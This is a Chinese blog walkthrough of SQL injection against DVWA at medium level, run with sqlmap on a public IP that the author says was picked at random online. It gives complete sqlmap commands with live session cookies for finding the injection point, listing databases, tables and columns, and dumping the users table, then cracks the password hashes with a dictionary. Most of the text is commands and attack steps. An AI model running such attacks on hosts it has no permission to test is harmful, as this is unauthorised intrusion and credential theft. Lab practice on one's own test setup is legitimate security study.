# 【渗透整理】DVWA SQL Injection  —等级：medium/high

接上一篇的《【渗透整理】SQL注入篇(1)》，这次我们还和上次一样网上随便找一个测试主机（测试用机不要太多）。这次的测试主机：106.54.82.231。游戏开始。

## 1、搜集信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191226005041467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)没有输入框了，使用一个可选的下拉框，可以知道一共有5个user，我随便点了4提交，F12查看网络，发现这次是用post方式提交，参数为id和submit，并且提交的时候使用了cookie。接下来我们开始构造语句，上sqlmap。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191226010044181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191226010058457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)

## 2、开始注入

Max HackBar 点开URL，发现url之前的不大一样，直接弄下来用，由于是POST提交，没有/?id 类似的参数，所以url不需要加参数，post的参数使用【–data “内容”】指定即可。

URL：
 http://106.54.82.231/DVWA/vulnerabilities/sqli/?http:%2f%2f106.54.82.231%2fDVWA%2fvulnerabilities%2fsqli%2f

post：
 id=3&Submit=Submit

网页导出的cookie：
 “PHPSESSID=ub0sdd4gv0615iea6gsv8d4134；security=medium；td_cookie=4193961465”

burp suite抓到的cookie：
 “td_cookie=4194069765; td_cookie=4193961465; security=medium; PHPSESSID=ub0sdd4gv0615iea6gsv8d4134”

我看了一下，这里两种方式出来的cookie是不一样的，于是我专门去踩雷去了，发现两个cookie都可以直接跟在–cookie参数后面使用，但是burp抓的cookie访问的时候不会出现302问你要不要重定向，你可以一路yes到底结果就出来了，但是网页导出的cookie会出现302重定向提示（可能是一种防护手段），你如果告诉sqlmap是(y)的话，那么不管跑多久，最后都不会有结果的，但是如果你选了否(n)，那么恭喜你，我们殊途同归了。

**流程开始**

1、检测注入点：
 python2 sqlmap.py -u  “http://106.54.82.231/DVWA/vulnerabilities/sqli/?http:%2f%2f106.54.82.231%2fDVWA%2fvulnerabilities%2fsqli%2f” --cookie=“td_cookie=4194069765; td_cookie=4193961465; security=medium;  PHPSESSID=ub0sdd4gv0615iea6gsv8d4134”  --data="id=3&Submit=Submit"![在这里插入图片描述](https://img-blog.csdnimg.cn/20191226011717722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)得到如下结果：
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191226011809771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)说明存在注入点，可以进行下一步了

2、爆库：
 D:\sqlmap\sqlmap>python2 sqlmap.py -u  “http://106.54.82.231/DVWA/vulnerabilities/sqli/?http:%2f%2f106.54.82.231%2fDVWA%2fvulnerabilities%2fsqli%2f” --cookie=“td_cookie=4194069765; td_cookie=4193961465; security=medium;  PHPSESSID=ub0sdd4gv0615iea6gsv8d4134”  --data=“id=3&Submit=Submit”  --dbs

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191226011919343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)结果如下：
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191226011947781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)3、爆表：
 python2 sqlmap.py -u  “http://106.54.82.231/DVWA/vulnerabilities/sqli/?http:%2f%2f106.54.82.231%2fDVWA%2fvulnerabilities%2fsqli%2f” --cookie=“td_cookie=4194069765; td_cookie=4193961465; security=medium;  PHPSESSID=ub0sdd4gv0615iea6gsv8d4134”  --data=“id=3&Submit=Submit”   --tables  -D“dvwa”
 得到如下：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191226012031150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)4、爆字段：
 python2 sqlmap.py -u  “http://106.54.82.231/DVWA/vulnerabilities/sqli/?http:%2f%2f106.54.82.231%2fDVWA%2fvulnerabilities%2fsqli%2f” --cookie=“td_cookie=4194069765; td_cookie=4193961465; security=medium;  PHPSESSID=ub0sdd4gv0615iea6gsv8d4134”  --data=“id=3&Submit=Submit”   --columns  -D“dvwa” -T “users”
 得到如下：
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191226012131848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)5、爆内容：
 python2 sqlmap.py -u  “http://106.54.82.231/DVWA/vulnerabilities/sqli/?http:%2f%2f106.54.82.231%2fDVWA%2fvulnerabilities%2fsqli%2f” --cookie=“td_cookie=4194069765; td_cookie=4193961465; security=medium;  PHPSESSID=ub0sdd4gv0615iea6gsv8d4134”  --data=“id=3&Submit=Submit”   --dump  -D“dvwa” -T “users” -C “,user_id,user,password”
 得到如下：
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191226012220165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)这里其实已经爆出我们想要的内容了，但是密码是加密过的，我们想进一步处理的话请继续。

此时sqlmap回显：
 do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
 是否要将散列存储到临时文件中，以便最终使用其他工具进行进一步处理[y/N]y  【选y】

do you want to crack them via a dictionary-based attack? [Y/n/q] y
 你想通过基于字典的攻击来破解它们吗？[Y/n/q]y 【选y】

[1] default dictionary file ‘D:\sqlmap\sqlmap\txt\wordlist.zip’ (press Enter)
 [2] custom dictionary file
 [3] file with list of dictionary files
 [1] 默认字典文件’D:\ sqlmap\sqlmap\txt\wordlist.zip’（按回车键）
 [2] 自定义词典文件
 [3] 包含字典文件列表的文件
 【选1】

do you want to use common password suffixes? (slow!) [y/N] n
 是否要使用常用密码后缀？（慢！）[是/否] 【选N】

由于数据库的密码一般都是ND5加密后存储的，这里实验都是弱口令，所以sqlmap可以用自带的字典把密码明文给撞出来，之后在格式化输出，简直不要太爽。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191226012752570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)

## 3、总结

踩雷burp和网页导出的cookie不一致，下次注意这个问题，还是burp一下心理放心。post型的注入用指定参数的方法完成，用法：–data  “提交的参数”。指定参数的方法并不是唯一的方式，其他的方式后面再试。cookie如果有多条的话用分号；隔开，顺序应该不影响结果。sqlmap自带MD5撞库功能，可以省不少事。
 还想说圣诞快乐的，写完都一点了。学习使人头秃。

by 久违 2019.12.25